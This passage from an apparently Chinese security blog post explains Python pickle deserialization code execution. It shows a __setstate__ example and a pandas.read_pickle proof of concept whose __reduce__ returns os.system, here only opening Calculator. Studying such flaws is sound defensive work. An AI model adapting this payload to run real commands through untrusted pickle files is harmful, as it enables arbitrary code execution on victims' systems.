<span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name</span>):<br>        self.name = name<br>    <br>    <span class="hljs-comment"># 构造 __setstate__ 方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__setstate__</span>(<span class="hljs-params">self,name</span>):<br>        os.system(<span class="hljs-string">&#x27;open /System/Applications/Calculator.app/&#x27;</span>)   <span class="hljs-comment"># 恶意代码</span><br>    <br>tmp = pickle.dumps(SerializePerson(<span class="hljs-string">&#x27;tom&#x27;</span>)) <span class="hljs-comment"># 序列化</span><br>pickle.loads(tmp) <span class="hljs-comment"># 反序列化 此时会弹出计算器</span><br></code></pre></td></tr></table></figure><p>执行代码至pickle.loads(tmp)，计算器被弹出：所以对于任意实现了pickle序列化的接口，如果我们可以控制传入的将要反序列化的对象，那么我们就可以执行任意代码了。</p><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p>由于不少的三方库都使用了pickle来做反序列化。因此如果没有其他的安全处理和过滤就很容易产生安全问题。</p><p>举个例子：pandas作为python里最为强大的数据分析和处理库，在几乎全版本中都存在pickle反序列化漏洞的问题。</p><p>其中的接口 pandas.read_pickle(filename) 实现了读取pkl类型文件的功能。</p><p>对于数据分析工程师和算法工程师来说，这个文件可能是数据集或者别人已经训练好的模型。而当读取的文件是我们恶意构造的对象时，他就可以在目标应用中执行任意代码</p><p>问题代码的 pandas.read_pickle() 位于 pands&#x2F;io&#x2F;pickle.py 100行左右。我们可以看到他是直接调用了 pickle.load() 这一函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">with</span> warnings.catch_warnings(record=<span class="hljs-literal">True</span>):<br>        <span class="hljs-comment"># We want to silence any warnings about, e.g. moved modules.</span><br>        warnings.simplefilter(<span class="hljs-string">&quot;ignore&quot;</span>, Warning)<br>        <span class="hljs-keyword">return</span> pickle.load(f)<br><span class="hljs-keyword">except</span> excs_to_catch:<br>    <span class="hljs-comment"># e.g.</span><br>    <span class="hljs-comment">#  &quot;No module named &#x27;pandas.core.sparse.series&#x27;&quot;</span><br>    <span class="hljs-comment">#  &quot;Can&#x27;t get attribute &#x27;__nat_unpickle&#x27; on &lt;module &#x27;pandas._libs.tslib&quot;</span><br>    <span class="hljs-keyword">return</span> pc.load(f, encoding=<span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;open /System/Applications/Calculator.app&#x27;</span>,))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.pickle&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    pickle.dump(Test(), f)<br><br>pd.read_pickle(<span class="hljs-string">&quot;test.pickle&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>反序列化</tag>
      
      <tag>CVE</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
